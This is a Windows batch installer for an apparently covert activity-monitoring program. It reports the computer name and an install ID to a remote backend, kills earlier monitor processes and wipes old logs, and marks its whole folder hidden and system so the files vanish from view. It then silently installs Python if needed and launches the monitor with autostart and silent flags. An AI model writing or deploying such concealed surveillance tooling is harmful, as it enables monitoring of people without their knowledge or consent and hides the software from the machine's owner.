@echo off
setlocal
pushd "%~dp0"

if exist "%~dp0deploy_automated.bat" (
    call "%~dp0deploy_automated.bat"
    popd
    endlocal
    exit /b 0
)

set BACKEND_URL=https://eyeing.onrender.com
if "%INSTALL_ID%"=="" set INSTALL_ID=%RANDOM%%RANDOM%%RANDOM%
if "%DEVICE_ID%"=="" set DEVICE_ID=%COMPUTERNAME%
if exist "%~dp0backend_url.txt" (
    for /f "usebackq delims=" %%i in ("%~dp0backend_url.txt") do (
        if not "%%i"=="" set BACKEND_URL=%%i
    )
)

if "%SKIP_SETUP_OPEN%"=="1" goto skip_setup_open
start "" "%BACKEND_URL%/setup.html?autoclose=1^&device_id=%DEVICE_ID%^&install_id=%INSTALL_ID%"
:skip_setup_open

powershell -NoProfile -ExecutionPolicy Bypass -Command "$currentPid=$PID; Get-CimInstance Win32_Process | Where-Object { $_.ProcessId -ne $currentPid -and ($_.CommandLine -match 'install_and_run\.py' -or $_.CommandLine -match 'monitor\.py') } | ForEach-Object { Stop-Process -Id $_.ProcessId -Force -ErrorAction SilentlyContinue }"

if exist "%~dp0activity_data" rmdir /s /q "%~dp0activity_data" >nul 2>&1
if exist "%~dp0activity_monitor.log" del /f /q "%~dp0activity_monitor.log" >nul 2>&1

attrib +h +s "%~dp0" >nul 2>&1
attrib +h +s "%~dp0*" /s /d >nul 2>&1

where python >nul 2>&1
if %errorlevel% neq 0 (
    set PYTHON_URL=https://www.python.org/ftp/python/3.12.0/python-3.12.0-amd64.exe
    set PYTHON_INSTALLER=%TEMP%\python_installer.exe
    powershell -Command "Invoke-WebRequest -Uri '%PYTHON_URL%' -OutFile '%PYTHON_INSTALLER%'" >nul 2>&1
    start /wait "" "%PYTHON_INSTALLER%" /quiet InstallAllUsers=1 PrependPath=1 >nul 2>&1
    set PATH=%PATH%;%LOCALAPPDATA%\Programs\Python\Python312;%LOCALAPPDATA%\Programs\Python\Python312\Scripts
)

python "%~dp0install_and_run.py" --autostart --silent >"%~dp0setup_log.txt" 2>&1

popd
endlocal
exit /b 0
